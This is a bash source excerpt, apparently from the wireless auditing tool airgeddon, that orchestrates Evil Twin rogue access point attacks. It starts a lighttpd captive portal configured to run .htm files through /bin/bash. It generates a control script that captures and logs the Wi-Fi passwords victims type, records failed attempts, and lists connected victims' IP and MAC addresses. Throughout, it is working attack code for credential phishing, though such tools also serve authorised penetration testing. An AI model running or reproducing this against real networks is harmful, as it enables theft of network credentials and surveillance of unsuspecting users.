#Launch control window for Evil Twin attacks
function launch_et_control_window() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			control_scr_window_position=${g1_topright_window}
		;;
		"et_sniffing")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_captive_portal")
			control_scr_window_position=${g4_topright_window}
		;;
		"et_sniffing_sslstrip2")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_sniffing_sslstrip2_beef")
			control_scr_window_position=${g4_topright_window}
		;;
	esac
	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_process_control_window=$!
	else
		get_tmux_process_id "bash \"${tmpdir}${control_et_file}\""
		et_process_control_window="${global_process_pid}"
		global_process_pid=""
	fi
}


#Launch lighttpd webserver for captive portal Evil Twin attack
function launch_webserver() {

	debug_print

	kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
	recalculate_windows_sizes
	lighttpd_window_position=${g4_bottomright_window}
	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "lighttpd -D -f \"${tmpdir}${webserver_file}\""
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}


#Create configuration file for lighttpd
function set_webserver_config() {

	debug_print

	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1

	{
	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_cgi\""
	echo -e ")\n"
	echo -e "server.port = ${www_port}\n"
	echo -e "index-file.names = ( \"${indexfile}\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} >> "${tmpdir}${webserver_file}"

	sleep 2
}

#Create here-doc bash script used for control windows on Evil Twin attacks
function set_et_control_script() {

	debug_print

	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1

	exec 7>"${tmpdir}${control_et_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash
		et_heredoc_mode=${et_mode}
	EOF

	cat >&7 <<-'EOF'
		if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
			path_to_processes="${tmpdir}${webdir}${et_processesfile}"
			attempts_path="${tmpdir}${webdir}${attemptsfile}"
			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			function kill_et_windows() {

				readarray -t ET_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
				for item in "${ET_PROCESSES_TO_KILL[@]}"; do
					kill "${item}" &> /dev/null
				done
			}
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&7 <<-EOF
			function finish_evil_twin() {

				echo "" > "${et_captive_portal_logpath}"
	EOF

	cat >&7 <<-'EOF'
				date +%Y-%m-%d >>\
	EOF

	cat >&7 <<-EOF
				"${et_captive_portal_logpath}"
				{
				echo "${et_misc_texts[${language},19]}"
				echo ""
				echo "BSSID: ${bssid}"
				echo "${et_misc_texts[${language},1]}: ${channel}"
				echo "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
				} >> "${et_captive_portal_logpath}"
				success_pass_path="${tmpdir}${webdir}${currentpassfile}"
				msg_good_pass="${et_misc_texts[${language},11]}:"
				log_path="${et_captive_portal_logpath}"
				log_reminder_msg="${pink_color}${et_misc_texts[${language},24]}: [${normal_color}${et_captive_portal_logpath}${pink_color}]${normal_color}"
				done_msg="${yellow_color}${et_misc_texts[${language},25]}${normal_color}"
				echo -e "\t${blue_color}${et_misc_texts[${language},23]}:${normal_color}"
				echo
	EOF

	cat >&7 <<-'EOF'
				echo "${msg_good_pass} $( (cat < ${success_pass_path}) 2> /dev/null)" >> "${log_path}"
				attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
				et_password=$( (cat < ${success_pass_path}) 2> /dev/null)
				echo -e "\t${et_password}"
				echo
				echo -e "\t${log_reminder_msg}"
				echo
				echo -e "\t${done_msg}"
				if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
					{
					echo ""
					echo "---------------"
					echo ""
					echo "${et_misc_texts[${language},22]}:"
					echo ""
					} >> "${et_captive_portal_logpath}"
					readarray -t BADPASSWORDS < <(cat < "${tmpdir}${webdir}${attemptsfile}" 2> /dev/null)
	EOF

	cat >&7 <<-'EOF'
					for badpass in "${BADPASSWORDS[@]}"; do
						echo "${badpass}" >>\
	EOF

	cat >&7 <<-EOF
						"${et_captive_portal_logpath}"
					done
				fi

				{
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},0]}"
				} >> "${et_captive_portal_logpath}"

				sleep 2
	EOF

	cat >&7 <<-'EOF'
				kill_et_windows
				kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C dnsmasq --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
				kill_tmux_windows "Control"
		EOF
	fi

	cat >&7 <<-EOF
				exit 0
			}
		fi
	EOF

	cat >&7 <<-'EOF'
		date_counter=$(date +%s)
		while true; do
	EOF

	case ${et_mode} in
		"et_onlyap")
			local control_msg=${et_misc_texts[${language},4]}
		;;
		"et_sniffing"|"et_sniffing_sslstrip2")
			local control_msg=${et_misc_texts[${language},5]}
		;;
		"et_sniffing_sslstrip2_beef")
			local control_msg=${et_misc_texts[${language},27]}
		;;
		"et_captive_portal")
			local control_msg=${et_misc_texts[${language},6]}
		;;
	esac

	cat >&7 <<-EOF
			if [ "${channel}" != "${et_channel}" ]; then
				et_control_window_channel="${et_channel} (5Ghz: ${channel})"
			else
				et_control_window_channel="${channel}"
			fi
			echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
			echo
			echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
			echo -e "\t${hours}:${mins}:${secs}"
	EOF

	cat >&7 <<-EOF
			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
	EOF

	cat >&7 <<-'EOF'
			if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
				if [ -f "${tmpdir}${webdir}${et_successfile}" ]; then
					clear
					echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
					echo
					echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
					echo -e "\t${hours}:${mins}:${secs}"
					echo
					finish_evil_twin
				else
					attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
					last_password=$(grep "." ${attempts_path} 2> /dev/null | tail -1)
					tput el && echo -ne "\t${attempts_text} ${attempts_number}"
					if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
						open_parenthesis="${yellow_color}(${normal_color}"
						close_parenthesis="${yellow_color})${normal_color}"
	EOF

	cat >&7 <<-'EOF'
						echo -ne " ${open_parenthesis} ${last_password_msg} ${last_password} ${close_parenthesis}"
					fi
				fi
				echo
				echo
			fi
	EOF

	cat >&7 <<-EOF
			echo -e "\t${green_color}${et_misc_texts[${language},3]}${normal_color}"
			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
			client_ips=()
	EOF

	cat >&7 <<-'EOF'
			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
	EOF

	cat >&7 <<-EOF
				echo -e "\t${et_misc_texts[${language},7]}"
			else
	EOF

	cat >&7 <<-'EOF'
				for client in "${DHCPCLIENTS[@]}"; do
					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
					if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
						client_hostname=""
						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
						if [[ -z "${client_hostname}" ]]; then
							echo -e "\t${client_ip} ${client_mac}"
						else
							echo -e "\t${client_ip} ${client_mac} ${client_hostname}"
						fi
					fi
					client_ips+=(${client_ip})
				done
			fi
			echo -ne "\033[K\033[u"
			sleep 0.3
			current_window_size="$(tput cols)x$(tput lines)"
			if [ "${current_window_size}" != "${stored_window_size}" ]; then
				stored_window_size="${current_window_size}"
				clear
			fi
		done
	EOF

	exec 7>&-
	sleep 1
}
